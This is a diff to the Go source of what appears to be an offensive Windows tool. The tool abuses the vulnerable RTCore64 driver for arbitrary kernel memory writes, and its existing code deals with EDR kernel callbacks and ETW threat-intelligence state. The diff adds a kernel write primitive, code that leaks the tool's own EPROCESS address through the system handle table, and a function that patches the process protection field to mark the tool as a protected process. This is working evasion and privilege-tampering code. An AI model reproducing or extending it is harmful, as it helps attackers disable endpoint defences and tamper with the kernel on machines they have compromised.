@@ -4,6 +4,7 @@ package main
 //go:generate go run $GOROOT/src/syscall/mksyscall_windows.go -output syscallwin.go main.go
 
 import (
+	"bufio"
 	_ "embed"
 	"encoding/csv"
 	"fmt"
@@ -153,68 +154,21 @@ type FOUND_EDR_CALLBACKS struct {
 	EDR_CALLBACKS [256]KRNL_CALLBACK
 }
 
-/*
-//PPL Killer
-func RegGetString(hKey int, subKey string, value string) string {
-	var RRF_RT_REG_SZ uint32 = 0x00000002
-	var bufLen uint32
-	RegGetValueW(hKey, subKey, value, RRF_RT_REG_SZ, nil, 0, &bufLen)
-	if bufLen == 0 {
-		return ""
-	}
-	buf := make([]uint16, bufLen)
-	ret, _ := RegGetValueW(hKey, subKey, value, RRF_RT_REG_SZ, nil, uintptr(unsafe.Pointer(&buf[0])), &bufLen)
-	if ret != ERROR_SUCCESS {
-		return ""
-	}
-	return syscall.UTF16ToString(buf)
+//24byte
+type SYSTEM_HANDLE_TABLE_ENTRY_INFO struct {
+	UniqueProcessId       uint16
+	CreatorBackTraceIndex uint16
+	ObjectTypeIndex       uint8
+	HandleAttributes      uint8
+	HandleValue           uint16
+	Object                uintptr
+	GrantedAccess         uint32
 }
 
-func getVersionOffsets() Offsets {
-	winver := RegGetString(windows.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ReleaseId")
-	fmt.Printf("[+] Windows Version %s Found!\n", winver)
-	switch winver {
-	case "1607":
-		return Offsets{0x02e8, 0x02f0, 0x0358, 0x06c8}
-	case "1803":
-	case "1809":
-		return Offsets{0x02e0, 0x02e8, 0x0358, 0x06c8}
-	case "1903":
-	case "1909":
-		return Offsets{0x02e8, 0x02f0, 0x0360, 0x06f8}
-	case "2004":
-	case "2009":
-		return Offsets{0x0440, 0x0448, 0x04b8, 0x0878}
-	default:
-		fmt.Println("[!] Version Offsets Not Found!")
-		//os.Exit(-1)
-		return Offsets{0, 0, 0, 0}
-	}
-	return Offsets{0, 0, 0, 0}
+type SYSTEM_HANDLE_INFORMATION struct {
+	NumberOfHandles uint32                           //4
+	Handles         []SYSTEM_HANDLE_TABLE_ENTRY_INFO //any size
 }
-
-func findkrnlbase() DWORD64 {
-	cbNeeded := uint32(0)
-	var drivers [1024]DWORD64
-	if EnumDeviceDrivers(uintptr(unsafe.Pointer(&drivers)), 1024, &cbNeeded) {
-		return drivers[0]
-	}
-	//need error response
-	return drivers[0]
-}
-
-func getFunctionAddress(fnc string) DWORD64 {
-	ntoskrnlbaseaddress := findkrnlbase()
-	ntoskrnl, _ := LoadLibraryW("ntoskrnl.exe")
-	ntoskrnlProcaddress, _ := GetProcAddress(uintptr(ntoskrnl), fnc)
-	offset := DWORD64(ntoskrnlProcaddress) - DWORD64(ntoskrnl)
-	address := ntoskrnlbaseaddress + offset
-	FreeLibrary(ntoskrnl)
-	fmt.Println(address)
-	return address
-}
-
-*/
 
 func getDriverHandle() HANDLE {
 	name, err := syscall.UTF16PtrFromString("\\\\.\\RTCore64")
@@ -244,6 +198,13 @@ func writeMemoryPrimitive(device HANDLE, s DWORD, adr DWORD64, val DWORD) {
 func writeMemoryBYTE(device HANDLE, adr DWORD64, val DWORD64) {
 	currentValue := readMemoryDWORD64(device, adr)
 	val = (currentValue & 0xFFFFFFFFFFFFFFF0) | val
+	writeMemoryPrimitive(device, 4, adr, DWORD(val&0xffffffff))
+	writeMemoryPrimitive(device, 4, adr+4, DWORD(val>>32))
+}
+
+func writeMemoryWORD(device HANDLE, adr DWORD64, val DWORD64) {
+	currentValue := readMemoryDWORD64(device, adr)
+	val = (currentValue & 0xFFFFFFFFFFFFFF00) | val
 	writeMemoryPrimitive(device, 4, adr, DWORD(val&0xffffffff))
 	writeMemoryPrimitive(device, 4, adr+4, DWORD(val>>32))
 }
@@ -822,6 +783,76 @@ func isETWThreatIntelProviderEnabled() bool {
 	return state
 }
 
+func getEPROCESSAddress() uintptr {
+	pID := uint32(os.Getpid()) //os.Getpid()
+	pHandle, err := windows.OpenProcess(windows.SYNCHRONIZE, false, pID)
+	if err != nil {
+		panic(err)
+	}
+	defSize := uint32(0x800000)
+	tmpSysHandleInfo := make([]byte, defSize)
+	sysHandleTableEntryInfoSize := int(unsafe.Sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO{}))
+	var sysHandleInfo SYSTEM_HANDLE_INFORMATION
+	var retSize uint32
+	status := windows.NtQuerySystemInformation(0x10, unsafe.Pointer(&tmpSysHandleInfo[0]), defSize, &retSize)
+	if status != nil {
+		if uint32(status.(windows.NTStatus)) == 0xc0000004 {
+			overSize := retSize * 2
+			tmpSysHandleInfo = make([]byte, overSize)
+			status = windows.NtQuerySystemInformation(0x10, unsafe.Pointer(&tmpSysHandleInfo[0]), overSize, &overSize)
+			if status != nil {
+				fmt.Println(status)
+				return 0
+			}
+		} else {
+			fmt.Println(status)
+			return 0
+		}
+	}
+	byteSysHandleInfo := tmpSysHandleInfo[:retSize]
+	sysHandleInfoCount := *(*uint32)(unsafe.Pointer(&byteSysHandleInfo[0]))
+	sysHandleInfo.NumberOfHandles = sysHandleInfoCount
+
+	sysHandleInfo.Handles = make([]SYSTEM_HANDLE_TABLE_ENTRY_INFO, sysHandleInfoCount)
+	for i := 0; i < int(sysHandleInfoCount); i++ {
+		sysHandleInfo.Handles[i] = *(*SYSTEM_HANDLE_TABLE_ENTRY_INFO)(unsafe.Pointer(&byteSysHandleInfo[8+(sysHandleTableEntryInfoSize*i)]))
+	}
+	//sysHandleInfo.Handles = (*(*[0x1000000]SYSTEM_HANDLE_TABLE_ENTRY_INFO)(unsafe.Pointer(&byteSysHandleInfo[8])))[:]
+
+	println(sysHandleInfo.Handles)
+	for i := 0; i < int(sysHandleInfo.NumberOfHandles); i++ {
+		handle := sysHandleInfo.Handles[i]
+		if handle.UniqueProcessId != uint16(pID) {
+			continue
+		}
+		fmt.Printf("[*] Handle for the current process (PID: %d): 0x%x at 0x%x debug handle:%x\n", pID, handle.HandleValue, handle.Object, pHandle)
+		if handle.HandleValue == uint16(uintptr(pHandle)) {
+			fmt.Printf("[+] Found the handle of the current process (PID: %d): 0x%x at 0x%x\n", pID, handle.HandleValue, handle.Object)
+			return handle.Object
+		}
+	}
+	windows.CloseHandle(pHandle)
+	return 0
+}
+
+func setProcessAsProtected() {
+	device := getDriverHandle()
+
+	ntoskrnlOffsets := getNtoskrnlVersion()
+	ntoskrnlVersion := ntoskrnlOffsets.ntoskrnlVersion
+	if ntoskrnlVersion == "" {
+		fmt.Printf("NtoskrnlVersion not found -> %s\n", ntoskrnlOffsets.ntoskrnlVersion)
+		return
+	}
+	fmt.Printf("NtoskrnlVersion is %s\n", ntoskrnlOffsets.ntoskrnlVersion)
+
+	processEPROCESSAddress := getEPROCESSAddress()
+	processSignatureLevelAddress := DWORD64(processEPROCESSAddress + uintptr(ntoskrnlOffsets.psProtection))
+
+	writeMemoryWORD(device, processSignatureLevelAddress, 0x61)
+	CloseHandle(device)
+}
+
 /*
 //PPLKiller
 func makeSystem() {
@@ -893,7 +924,15 @@ func main() {
 		installVulnDriver()
 	} else if os.Args[1] == "/uninstall" {
 		uninstallVulnDriver()
+	} else if os.Args[1] == "/test" {
+		//setProcessAsProtected()
+		getEPROCESSAddress()
+		bufio.NewScanner(os.Stdin).Scan()
+		time.Sleep(100000)
 	} else {
 		fmt.Println(usage)
 	}
+
+	//CSV output
+	//CSV import
 }
